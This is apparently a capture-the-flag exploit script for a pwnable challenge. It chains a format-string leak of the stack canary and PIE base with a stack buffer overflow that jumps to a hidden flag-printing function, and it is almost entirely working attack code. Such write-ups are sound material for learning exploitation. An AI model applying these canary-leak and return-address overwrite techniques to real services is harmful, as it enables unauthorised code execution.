"""Buffy Vampire#2 (pwnable, medium) -- armory / Quartermaster ledger.

Two bugs, chained:
1. `cmd_note` (NOTE <text>): user text strncpy'd (31 bytes, not guaranteed
   null-terminated) into a stack buffer, then passed DIRECTLY as printf's
   format string -> classic format-string bug. Used here as an arbitrary
   stack-read leak via positional specifiers (%N$p):
     - %13$p -> the stack canary (random per-process, low byte always 0x00)
     - %15$p -> cmd_note's own return address into main() == PIE_base + 0x1d89
       (0x1d89 is the static address of the `jmp` right after `call cmd_note`
       in main, confirmed via objdump; constant since this is a PIE binary
       and only the *load base* is randomized, not the internal layout).

2. `cmd_commit` (COMMIT): loops `read(0, buf, ...)` until it has collected
   0x200 (512) bytes into an 80-byte stack buffer (`sub rsp,0x60`, buffer at
   rbp-0x50) with no bounds check -- classic stack buffer overflow. Same
   buffer-to-canary/retaddr offsets as Buffy Vampire#1's cmd_seal: canary at
   buffer offset 72, saved rbp at 80, return address at 88.

Exploit: leak canary + PIE base via NOTE, then overflow COMMIT's buffer with
filler + the leaked canary (to pass __stack_chk_fail) + filler saved-rbp +
the address of `reissue_sealed_record` (PIE_base + 0x139f), a function that
exists in the binary but is never called by the normal command dispatch --
it just opens/reads/writes /opt/armory/.ledger/record.dat (the flag) to
stdout and _exit(0)s.
"""
import socket
import sys

RET_INTO_MAIN_OFFSET = 0x1D89  # cmd_note's return address, static in the PIE binary
REISSUE_SEALED_RECORD_OFFSET = 0x139F

CANARY_POS = 13
RETADDR_POS = 15


class Conn:
    def __init__(self, sock: socket.socket):
        self.s = sock
        self.buf = b""

    def _fill(self, n: int = 4096):
        chunk = self.s.recv(n)
        if not chunk:
            raise EOFError("connection closed")
        self.buf += chunk

    def recv_until(self, marker: bytes, maxlen: int = 65536) -> bytes:
        while marker not in self.buf and len(self.buf) < maxlen:
            self._fill()
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def sendall(self, data: bytes):
        self.s.sendall(data)

    def drain(self, timeout=3) -> bytes:
        self.s.settimeout(timeout)
        out = self.buf
        self.buf = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        return out


def leak_value(s: Conn, pos: int) -> int:
    payload = f"%{pos}$p".encode()
    s.sendall(b"NOTE " + payload + b"\n")
    line = s.recv_until(b"\n")
    text = line.decode(errors="replace").strip()
    # "note recorded: 0x...."
    hexpart = text.rsplit(" ", 1)[-1]
    return int(hexpart, 16)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(10)
    s = Conn(sock)

    s.recv_until(b"qm> ")

    canary = leak_value(s, CANARY_POS)
    s.recv_until(b"qm> ")
    retaddr = leak_value(s, RETADDR_POS)
    s.recv_until(b"qm> ")

    pie_base = retaddr - RET_INTO_MAIN_OFFSET
    reissue = pie_base + REISSUE_SEALED_RECORD_OFFSET

    print(f"canary     : {canary:#018x}")
    print(f"ret->main  : {retaddr:#018x}")
    print(f"pie base   : {pie_base:#018x}")
    print(f"reissue_sealed_record: {reissue:#018x}")

    payload = b"A" * 72
    payload += canary.to_bytes(8, "little")
    payload += b"C" * 8  # saved rbp, don't care
    payload += reissue.to_bytes(8, "little")

    s.sendall(b"COMMIT\n")
    s.recv_until(b"commit: ")
    s.sendall(payload)
    # cmd_commit loops read() until it collects 0x200 bytes total; our
    # payload is only 96 bytes, so half-close to force read()<=0 (EOF)
    # and break the loop early instead of blocking for more input.
    sock.shutdown(socket.SHUT_WR)

    out = s.drain(5)
    print("---- response ----")
    print(out.decode(errors="replace"))
    sock.close()


if __name__ == "__main__":
    main()
